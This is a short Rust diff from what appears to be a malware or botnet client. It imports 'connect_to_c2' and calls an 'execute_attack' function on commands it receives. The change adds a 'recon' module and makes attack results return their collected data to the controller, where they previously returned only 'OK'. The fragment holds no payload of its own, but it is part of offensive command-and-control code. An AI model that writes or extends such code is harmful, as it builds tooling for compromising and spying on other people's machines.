@@ -11,6 +11,7 @@ mod encryption;
 mod utils;
 mod p2p;
 mod agentic;
+mod recon;
 
 use config::FullConfig;
 use communication::connect_to_c2;
@@ -68,7 +69,7 @@ fn main() {
                     };
 
                     let result_str = match execute_attack(&command).await {
-                        Ok(()) => "OK".to_string(),
+                        Ok(data) => data,
                         Err(e) => format!("Error: {}", e),
                     };
 
